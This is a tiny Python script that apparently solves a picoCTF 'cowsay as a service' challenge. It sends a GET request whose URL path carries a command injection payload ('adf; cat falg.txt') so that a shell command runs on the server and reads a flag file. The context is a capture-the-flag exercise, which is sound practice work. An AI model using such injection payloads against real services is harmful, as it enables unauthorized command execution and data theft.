import requests as r

message = "adf; cat falg.txt "
URL = f'https://caas.mars.picoctf.net/cowsay/{message}'

res = r.get(URL)
print(res.ok)
print(res.text)
